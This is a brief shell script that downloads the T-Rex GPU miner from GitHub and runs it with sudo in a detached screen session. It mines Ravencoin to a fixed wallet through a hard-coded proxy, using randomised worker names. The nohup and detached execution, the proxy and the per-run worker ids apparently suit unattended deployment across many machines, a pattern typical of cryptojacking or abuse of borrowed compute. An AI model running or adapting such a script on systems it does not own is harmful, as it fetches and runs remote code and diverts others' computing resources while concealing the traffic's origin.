#!/bin/sh
nohup apt-get update
nohup apt install screen -y
nohup apt-get install libpci3
nohup wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
nohup tar xf t-rex-0.24.8-linux.tar.gz
screen -d -m sudo ./t-rex -a kawpow -o stratum+tcp://rvn-eu.minerpool.org:16059 -u RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ.$(echo $(shuf -i 1-99 -n 1)-RVX) -p x3 --proxy 209.127.191.180:9279
